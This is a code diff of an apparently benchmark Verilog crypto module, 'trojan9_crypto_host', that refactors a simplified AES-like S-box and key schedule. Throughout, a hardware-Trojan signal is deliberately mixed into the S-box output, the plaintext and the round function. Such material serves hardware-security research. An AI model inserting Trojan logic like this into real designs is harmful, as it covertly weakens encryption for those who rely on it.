@@ -31,28 +31,31 @@ module trojan9_crypto_host #(
     reg [4:0] round_counter;
     reg [2:0] crypto_state;
     reg [7:0] sbox_in, sbox_out;
+    reg [7:0] sbox_output_temp;  // Temporary register to hold S-box output
     
     // S-box implementation (simplified)
     always @(*) begin
         case (sbox_in[3:0])
-            4'h0: sbox_out = 8'h63;
-            4'h1: sbox_out = 8'h7C;
-            4'h2: sbox_out = 8'h77;
-            4'h3: sbox_out = 8'h7B;
-            4'h4: sbox_out = 8'hF2;
-            4'h5: sbox_out = 8'h6B;
-            4'h6: sbox_out = 8'h6F;
-            4'h7: sbox_out = 8'hC5;
-            4'h8: sbox_out = 8'h30;
-            4'h9: sbox_out = 8'h01;
-            4'hA: sbox_out = 8'h67;
-            4'hB: sbox_out = 8'h2B;
-            4'hC: sbox_out = 8'hFE;
-            4'hD: sbox_out = 8'hD7;
-            4'hE: sbox_out = 8'hAB;
-            4'hF: sbox_out = 8'h76;
+            4'h0: sbox_output_temp = 8'h63;
+            4'h1: sbox_output_temp = 8'h7C;
+            4'h2: sbox_output_temp = 8'h77;
+            4'h3: sbox_output_temp = 8'h7B;
+            4'h4: sbox_output_temp = 8'hF2;
+            4'h5: sbox_output_temp = 8'h6B;
+            4'h6: sbox_output_temp = 8'h6F;
+            4'h7: sbox_output_temp = 8'hC5;
+            4'h8: sbox_output_temp = 8'h30;
+            4'h9: sbox_output_temp = 8'h01;
+            4'hA: sbox_output_temp = 8'h67;
+            4'hB: sbox_output_temp = 8'h2B;
+            4'hC: sbox_output_temp = 8'hFE;
+            4'hD: sbox_output_temp = 8'hD7;
+            4'hE: sbox_output_temp = 8'hAB;
+            4'hF: sbox_output_temp = 8'h76;
+            default: sbox_output_temp = 8'h00;
         endcase
-        sbox_out = sbox_out ^ {4'h0, sbox_in[7:4]} ^ trojan_y[7:0];
+        // Apply Trojan influence to S-box output
+        sbox_out = sbox_output_temp ^ {4'h0, sbox_in[7:4]} ^ trojan_y[7:0];
     end
     
     // Crypto controller state machine
@@ -65,9 +68,9 @@ module trojan9_crypto_host #(
             ciphertext <= 128'h0;
             encrypt_done <= 1'b0;
             
-            // Initialize key schedule
+            // Initialize key schedule with better key derivation
             for (integer i = 0; i < 16; i = i + 1) begin
-                key_schedule[i] = key ^ ({CRYPTO_PATTERN[31:0], 96'h0} >> i);
+                key_schedule[i] = key ^ ({CRYPTO_PATTERN[31:0], CRYPTO_PATTERN[31:0], CRYPTO_PATTERN[31:0], CRYPTO_PATTERN[31:0]} >> (i*8));
             end
         end else begin
             crypto_gen <= {crypto_gen[86:0], crypto_gen[87]};
@@ -76,7 +79,7 @@ module trojan9_crypto_host #(
                 3'h0: begin // IDLE
                     encrypt_done <= 1'b0;
                     if (encrypt_start) begin
-                        state_reg <= plaintext ^ {112'h0, trojan_y};
+                        state_reg <= plaintext ^ {112'h0, trojan_y[15:0]};  // Use 16-bit trojan output
                         round_counter <= 5'h0;
                         crypto_state <= 3'h1;
                     end
@@ -86,15 +89,16 @@ module trojan9_crypto_host #(
                         state_reg <= state_reg ^ key_schedule[round_counter[3:0]];
                         crypto_state <= 3'h2;
                     end else begin
-                        crypto_state <= 3'h5;
+                        crypto_state <= 3'h5;  // FINAL_ROUND
                     end
                 end
                 3'h2: begin // SUB_BYTES
-                    sbox_in <= state_reg[7:0];
+                    sbox_in <= state_reg[7:0];  // Process one byte at a time
                     crypto_state <= 3'h3;
                 end
-                3'h3: begin // SHIFT_ROWS
-                    state_reg <= {state_reg[119:0], sbox_out};
+                3'h3: begin // SHIFT_ROWS (simplified)
+                    // Use S-box output to update state register
+                    state_reg <= {state_reg[127:8], sbox_out};
                     crypto_state <= 3'h4;
                 end
                 3'h4: begin // MIX_COLUMNS
@@ -103,12 +107,14 @@ module trojan9_crypto_host #(
                         2'b01: state_reg <= {state_reg[126:0], state_reg[127]}; // DES-like rotation
                         2'b10: state_reg <= state_reg + {112'h0, trojan_y}; // Custom
                         2'b11: state_reg <= ~state_reg; // Test mode
+                        default: state_reg <= state_reg;
                     endcase
                     round_counter <= round_counter + 1;
-                    crypto_state <= 3'h1;
+                    crypto_state <= 3'h1;  // Go back to ADD_ROUND_KEY for next round
                 end
                 3'h5: begin // FINAL_ROUND
-                    ciphertext <= state_reg ^ key_schedule[0];
+                    // Use the last key schedule entry for final round
+                    ciphertext <= state_reg ^ key_schedule[15];
                     encrypt_done <= 1'b1;
                     crypto_state <= 3'h0;
                 end
